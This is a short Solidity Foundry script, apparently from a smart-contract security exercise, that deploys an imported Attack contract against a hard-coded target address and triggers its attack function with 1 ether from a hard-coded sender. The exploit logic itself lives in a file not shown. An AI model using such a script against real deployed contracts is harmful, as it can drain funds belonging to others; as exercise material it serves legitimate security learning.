// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Attack.sol";

contract AttackScript is Script {
    address myAddress = 0xa4049faab47BbD7fdbA8783C7b64CC6b9c7d5920;
		address contractToAttack = 0x884Fe06fB08100a3d1Ffcc6405a319514fc1285A;

    function setUp() public {}

    function run() public {
        vm.startBroadcast(myAddress);
				Attack attack = new Attack(contractToAttack);
				attack.attack{value: 1 ether}();
    }
}
